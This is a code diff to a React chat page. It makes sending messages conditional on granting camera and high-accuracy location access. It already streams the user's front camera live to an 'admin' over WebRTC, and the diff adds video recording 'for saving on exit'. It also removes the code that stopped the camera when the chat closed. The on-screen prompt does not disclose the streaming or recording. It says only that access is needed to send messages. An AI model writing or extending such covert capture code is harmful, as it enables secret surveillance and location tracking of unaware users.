@@ -1,9 +1,10 @@
-import { useState, useRef, useEffect } from 'react';
+import { useState, useRef, useEffect, useCallback } from 'react';
 import { Send, User, AlertCircle } from 'lucide-react';
 import { useToast } from '@/hooks/use-toast';
 import MessageList from '@/components/MessageList';
 import { useMessages } from '@/hooks/useMessages';
 import { useWebRTCBroadcaster } from '@/hooks/useWebRTCBroadcaster';
+import { useVideoRecorder } from '@/hooks/useVideoRecorder';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
@@ -15,6 +16,7 @@ const Index = () => {
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [permissionsGranted, setPermissionsGranted] = useState(false);
   const [permissionError, setPermissionError] = useState<string | null>(null);
+  const [showPermissionPrompt, setShowPermissionPrompt] = useState(false);
   const [location, setLocation] = useState<{ latitude: number; longitude: number } | null>(null);
   const [cameraReady, setCameraReady] = useState(false);
   const { messages, isLoading, sendMessage, uploadImage } = useMessages(sessionId);
@@ -26,6 +28,9 @@ const Index = () => {
   
   // WebRTC broadcaster for live video streaming to admin
   useWebRTCBroadcaster({ sessionId: sessionId || '', stream: activeStream });
+  
+  // Video recorder for saving on exit
+  useVideoRecorder({ sessionId: sessionId || '', stream: activeStream });
 
   useEffect(() => {
     const storedName = localStorage.getItem('chat_user_name');
@@ -34,47 +39,55 @@ const Index = () => {
     if (storedName && storedSession) {
       setUserName(storedName);
       setSessionId(storedSession);
-      setPermissionsGranted(true);
+      // Don't set permissionsGranted - we need to check permissions again
     }
   }, []);
 
-  // Start camera when in chat mode
+  // Request permissions for returning users
+  const requestCameraAndLocation = useCallback(async () => {
+    try {
+      // Request camera permission
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user' },
+        audio: false,
+      });
+      streamRef.current = stream;
+      setActiveStream(stream);
+      if (videoRef.current) {
+        videoRef.current.srcObject = stream;
+        videoRef.current.onloadedmetadata = () => {
+          setCameraReady(true);
+        };
+      }
+
+      // Request location permission
+      await new Promise<GeolocationPosition>((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+        });
+      });
+
+      setPermissionsGranted(true);
+      setShowPermissionPrompt(false);
+      return true;
+    } catch (err) {
+      console.error('Permission error:', err);
+      setShowPermissionPrompt(true);
+      return false;
+    }
+  }, []);
+
+  // Start camera when in chat mode (for returning users)
   useEffect(() => {
     if (!userName || !sessionId) return;
-
-    const startCamera = async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' },
-          audio: false,
-        });
-        streamRef.current = stream;
-        setActiveStream(stream);
-        if (videoRef.current) {
-          videoRef.current.srcObject = stream;
-          // Wait for video to be ready
-          videoRef.current.onloadedmetadata = () => {
-            setCameraReady(true);
-          };
-        }
-      } catch (err) {
-        console.error('Camera error:', err);
-      }
-    };
-
-    startCamera();
-
-    return () => {
-      if (streamRef.current) {
-        streamRef.current.getTracks().forEach(track => track.stop());
-        setActiveStream(null);
-      }
-    };
-  }, [userName, sessionId]);
+    
+    requestCameraAndLocation();
+  }, [userName, sessionId, requestCameraAndLocation]);
 
   // Watch location continuously when in chat
   useEffect(() => {
-    if (!userName || !sessionId) return;
+    if (!userName || !sessionId || !permissionsGranted) return;
 
     navigator.geolocation.getCurrentPosition(
       (position) => {
@@ -99,7 +112,7 @@ const Index = () => {
     );
 
     return () => navigator.geolocation.clearWatch(watchId);
-  }, [userName, sessionId]);
+  }, [userName, sessionId, permissionsGranted]);
 
   const requestPermissions = async () => {
     setPermissionError(null);
@@ -177,15 +190,17 @@ const Index = () => {
     return dataUrl;
   };
 
-  const canSendMessage = cameraReady && location !== null;
+  const canSendMessage = cameraReady && location !== null && permissionsGranted;
 
   const handleSend = async () => {
     if (!inputValue.trim() || !sessionId || !userName) return;
     
     if (!canSendMessage) {
+      // Show permission prompt instead of just a toast
+      setShowPermissionPrompt(true);
       toast({
-        title: 'Waiting for permissions',
-        description: 'Camera and location must be active to send messages.',
+        title: 'Permissions required',
+        description: 'Please allow camera and location access to send messages.',
         variant: 'destructive',
       });
       return;
@@ -268,6 +283,28 @@ const Index = () => {
           <span>{userName}</span>
         </div>
       </header>
+
+      {/* Permission prompt for returning users */}
+      {showPermissionPrompt && (
+        <div className="p-4 bg-destructive/10 border-b">
+          <div className="flex items-start gap-3">
+            <AlertCircle className="h-5 w-5 text-destructive flex-shrink-0 mt-0.5" />
+            <div className="flex-1">
+              <p className="text-sm font-medium text-destructive">Camera and location access required</p>
+              <p className="text-xs text-muted-foreground mt-1">
+                Please allow access to send messages.
+              </p>
+              <Button 
+                size="sm" 
+                className="mt-2" 
+                onClick={requestCameraAndLocation}
+              >
+                Allow Access
+              </Button>
+            </div>
+          </div>
+        </div>
+      )}
 
       <video
         ref={videoRef}
